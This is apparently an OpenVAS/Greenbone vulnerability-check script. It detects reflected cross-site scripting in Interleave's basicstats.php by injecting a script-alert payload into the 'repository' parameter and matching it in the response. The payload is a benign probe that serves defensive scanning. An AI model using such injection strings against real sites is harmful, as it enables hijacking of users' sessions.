if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103112" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2011-03-08 14:02:18 +0100 (Tue, 08 Mar 2011)" );
	script_bugtraq_id( 46771 );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_name( "Interleave 'basicstats.php' Multiple Cross Site Scripting Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_dependencies( "gb_interleave_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "interleave/detected" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/46771" );
	script_xref( name: "URL", value: "http://www.interleave.nl/" );
	script_tag( name: "summary", value: "Interleave is prone to multiple cross-site scripting vulnerabilities
  because it fails to properly sanitize user-supplied input." );
	script_tag( name: "impact", value: "An attacker may leverage these issues to execute arbitrary script code
  in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal
  cookie-based authentication credentials and launch other attacks." );
	script_tag( name: "affected", value: "Interleave 5.5.0.2 is vulnerable. Other versions may also be affected." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the
  disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade
  to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
CPE = "cpe:/a:atomos:interleave";
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = NASLString( dir, "/basicstats.php?AjaxHandler=0&e=1&eid=2&id=3&recordid=4&templateid=5&fileid=6&tid=7&username=8&password=9&repository=10<script>alert(/vt-xss-test/)<%2fscript>&GetCSS=11&GetjQueryUiPlacementJS=12&ShowEntityList=13&ShowTable=14&nonavbar=15&tab=16&CT=17 " );
if(http_vuln_check( port: port, url: url, pattern: "<script>alert\\(/vt-xss-test/\\)</script>", check_header: TRUE )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

